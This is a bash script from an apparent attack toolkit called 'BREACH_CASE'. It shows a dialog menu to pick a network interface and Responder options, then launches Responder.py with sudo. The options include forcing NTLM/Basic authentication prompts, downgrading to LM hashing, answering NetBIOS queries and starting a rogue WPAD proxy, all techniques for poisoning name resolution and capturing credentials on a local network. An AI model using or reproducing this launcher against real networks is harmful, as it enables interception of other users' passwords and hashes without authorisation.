#!/bin/bash
: ${DIALOG_OK=0}
: ${DIALOG_CANCEL=1}
: ${DIALOG_HELP=2}
: ${DIALOG_EXTRA=3}
: ${DIALOG_ITEM_HELP=4}
: ${DIALOG_ESC=255}

interface_to_attack=""
responder_options=""

interface_choice()
{
    options=()
    for interface in $(sudo ifconfig | cut -d ' ' -f1| tr ':' '\n' | awk NF)
    do
            options+=("$interface" "")
    done
	
    cmd=(dialog --backtitle "BREACH_CASE" --cancel-label "Back" --menu "Interface choice" 13 40 30)
    
    interface_to_attack=$("${cmd[@]}" "${options[@]}" 2>&1 >/dev/tty)
	
    status=$?
    
    case ${status} in
        ${DIALOG_OK})
            options_choice
        ;;
        ${DIALOG_CANCEL})
            bash $(dirname $0)/../../attacks.sh
        ;;
        ${DIALOG_ESC})
            bash $(dirname $0)/../../attacks.sh
        ;;
    esac
}

options_choice()
{
    options=(
    1 "Basic HTTP authentification" off
    2 "Force NTLM/Basic authentication (prompt)" off
    3 "Force LM hashing downgrade for Windows XP/2000" off
    4 "Enable answers for netbios domain suffix queries" off
    5 "Start the WPAD rogue proxy server" off
    6 "Enable answers for netbios wredir suffix queries" off
    )
    
    cmd=(dialog --backtitle "BREACH_CASE" --cancel-label "Back" --separate-output --checklist "Options" 13 75 30)
    choices=$("${cmd[@]}" "${options[@]}" 2>&1 >/dev/tty)
    
    status=$?
    
    case ${status} in
        ${DIALOG_OK})
            for choice in ${choices}
            do
                case ${choice} in
                    1)
                        responder_options="$responder_options -b"
                        ;;
                    2)
                        responder_options="$responder_options -F"
                        ;;
                    3)
                        responder_options="$responder_options --lm"
                        ;;
                    4)
                        responder_options="$responder_options -d"
                        ;;
                    5)
                        responder_options="$responder_options -w"
                        ;;
                    6)
                        responder_options="$responder_options -r"
                        ;;
                esac
            done
        ;;
        ${DIALOG_CANCEL})
            interface_choice
        ;;
        ${DIALOG_ESC})
            bash $(dirname $0)/../../attacks.sh
        ;;
    esac
    
    sudo python $(dirname $0)/Responder.py -I ${interface_to_attack} ${responder_options}
    
}

interface_choice
